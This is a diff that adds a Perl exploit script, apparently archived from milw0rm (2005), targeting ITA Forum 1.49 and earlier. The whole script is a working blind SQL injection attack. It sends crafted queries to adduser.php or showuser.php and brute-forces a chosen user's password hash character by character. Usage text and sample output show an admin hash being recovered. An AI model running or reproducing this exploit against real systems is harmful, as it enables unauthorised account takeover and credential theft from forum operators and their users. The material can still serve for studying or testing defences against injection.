@@ -1,0 +1,143 @@
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+
+# ITA Forum 1.49 sql injection exploit with one char bruteforce by 1dt.w0lf // r57
+# 
+# ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+# example:
+# r57ita.pl http://127.0.0.1/ITA/ admin 0
+# [!] Exploiting adduser.php
+# Please wait...
+# [xxxxxxxxxxxxxxxx]
+#
+# USER_NAME: admin
+# USER_PASS: 340878063a81cd71
+#
+# example2:
+# r57ita.pl http://127.0.0.1/ITA/ admin 1
+# [!] Exploiting showuser.php
+# Please wait...
+# [xxxxxxxxxxxxxxxx]
+#
+# USER_NAME: admin
+# USER_PASS: 340878063a81cd71
+# ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+# greets2:
+# foster and all ghc members
+
+$path     = $ARGV[0];
+$username = $ARGV[1];
+$target   = $ARGV[2];
+
+$s_num = 1;
+$|++;
+
+if (@ARGV < 2) { &usage; }
+
+if($target) 
+ { 
+ $string = $username;
+ $path = $path."showuser.php"; 
+ print " [!] Exploiting showuser.php\r\n"; 
+ }
+else 
+ { 
+ $string = "&#1069;&#1090;&#1086;&#1090; &#1083;&#1086;&#1075;&#1080;&#1085; &#1091;&#1078;&#1077; &#1079;&#1072;&#1085;&#1103;&#1090;!";
+ $path = $path."adduser.php"; 
+ print " [!] Exploiting adduser.php\r\n"; 
+ }
+
+print " Please wait...\r\n";
+print " [";
+
+while(1)
+{
+if(&found(47,58)==0) { &found(96,122); } 
+$char = $i;
+if ($char=="0") 
+ { 
+ print qq{] 
+ 
+ USER_NAME: $username
+ USER_PASS: $allchar
+ };
+ exit(); 
+ }
+else 
+ { 
+ print "x"; 
+ $allchar .= chr($char); 
+ }
+$s_num++;
+}
+
+sub found($$)
+ {
+ my $fmin = $_[0];
+ my $fmax = $_[1];
+ if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
+ 
+ $r = int($fmax - ($fmax-$fmin)/2);
+ $check = " BETWEEN $r AND $fmax";
+ if ( &check($check) ) { &found($r,$fmax); }
+ else { &found($fmin,$r); }
+ }
+ 
+sub crack($$)
+ {
+ my $cmin = $_[0];
+ my $cmax = $_[1];
+ $i = $cmin;
+ while ($i<$cmax)
+  {
+  $crcheck = "=$i";
+  if ( &check($crcheck) ) { return $i; }
+  $i++;
+  }
+ $i = 0;
+ return $i;
+ }
+ 
+sub check($)
+ {
+ $n++;
+ $ccheck = $_[0];
+ if($target){
+ $http_query = $path."?uid=".$username."\' AND ascii(substring(user_pass,".$s_num.",1))".$ccheck." /*";
+ }
+ else{
+ $http_query = $path."?user_pass1=ghc4ever&user_pass2=ghc4ever&user_email=root\@microsoft.com&Submit=true&user_login=".$username."\' AND ascii(substring(user_pass,".$s_num.",1))".$ccheck." /*";
+ }
+ # wanna view xpl work?
+ # print "\r\n$http_query\r\n";
+ $mcb_reguest = LWP::UserAgent->new() or die;
+ $res = $mcb_reguest->post($http_query); 
+ @results = $res->content; 
+ 
+ foreach $result(@results)
+  {
+  if ($result =~ /$string/) { return 1; }
+  }
+ return 0;
+ }
+ 
+
+sub usage()
+ {
+ print q(
+    ITA Forum version <= 1.49 sql injection exploit ver2
+ ==========================================================
+    usage: r57ita.pl [path/to/forum/] [user_name] [target]
+  targets:
+           0 - adduser.php 
+           1 - showuser.php
+ ==========================================================   
+     e.g.: r57ita.pl http://blah.com/ admin 0
+ ==========================================================
+           visit www.rst.void.ru for more info
+ );
+ exit();
+ }
+
+# milw0rm.com [2005-01-13]
